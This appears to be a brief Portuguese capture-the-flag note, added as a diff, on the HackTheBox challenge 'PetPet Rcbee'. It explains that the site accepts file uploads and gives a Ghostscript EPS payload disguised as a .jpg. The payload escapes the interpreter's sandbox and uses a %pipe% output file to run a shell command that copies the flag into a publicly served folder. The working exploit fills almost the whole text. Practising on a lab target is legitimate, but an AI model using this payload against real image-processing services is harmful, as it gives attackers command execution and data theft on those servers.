@@ -1,0 +1,14 @@
+PetPet Rcbee - Hackthebox
+
+tem um campo para fazer upload de arquivos, então vamos injetar código no .jpg:
+
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
